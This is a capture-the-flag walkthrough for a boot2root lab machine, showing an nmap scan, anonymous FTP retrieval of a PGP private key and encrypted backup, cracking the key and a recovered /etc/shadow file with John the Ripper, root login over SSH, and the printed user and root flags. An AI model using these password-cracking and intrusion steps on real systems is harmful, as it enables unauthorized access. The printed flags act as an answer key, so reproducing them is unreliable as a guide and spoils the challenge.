## Overview:
boot2root machine for FIT and bsides guatemala CTF

**Task: Read user.txt and root.txt**

## Recon:
Let's start with a basic nmap scan to see which ports are open.
```bash
nmap -A 10.10.190.223                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 16:43 +06
Nmap scan report for 10.10.190.223
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Sep 23 03:40 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x   92 0        0               0 Sep 23 03:40 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Sep 23 03:40 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Sep 23 03:40 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.120.190
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 5 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   46.53 ms  10.17.0.1
2   ... 4
5   197.14 ms 10.10.190.223

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.79 seconds
```
So FTP is our target as it has anonymous login allowed, let's explore it.

## FTP_RECON
After logging into the FTP server anonymously, I found two interesting files in one of the directories:\
● backup.pgp\
● private.asc\
I downloaded both files to my local machine using the FTP get command:
```bash
ftp> get backup.pgp
ftp> get private.asc
```
## Inspection
The private.asc file looked like a PGP private key. I confirmed this by viewing its contents:
```bash
cat private.asc
```
It started with:
```bash
-----BEGIN PGP PRIVATE KEY BLOCK-----
```
This meant I could potentially use it to decrypt backup.pgp.

**Importing the Private Key**
I tried to import the key into my GPG keyring:
```bash
gpg --import private.asc
```
But it's password protected, now we have to crack it with john.
```bash
gpg2john private.asc > hash.txt
```
We made the hash of the file for cracking.\
Now we can start:
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
You'll get the pass soon after executing.

Now again try to import the gpg key and when asks for pass, provide the password we cracked. And the key will be successfully imported.
## Decryption
With the key imported, I decrypted the backup.pgp file:
```bash
gpg --decrypt backup.pgp > data.txt
```
I inspected the contents of the decrypted file.\
To my surprise, it was a Linux /etc/shadow file, containing password hashes for system users, including root.

## Cracking the Shadow File
I used John the Ripper with the rockyou.txt wordlist to crack the hashes:
```bash
john data.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
At this point, I was expecting to crack a regular user's password, but to my surprise, John immediately cracked the root user's password!

## Logging In as Root
With the root password now known, I attempted to log into the target machine via SSH:
```bash
ssh root@<target-ip>
```
I entered the cracked password and successfully gained root access.\
Now inside root directory you'll get root.txt and user.txt in /home/melodias/ 

***● user.txt: 606083fd33beb1284fc51f411a706af8***\
***● root.txt: f706456440c7af4187810c31c6cebdce***
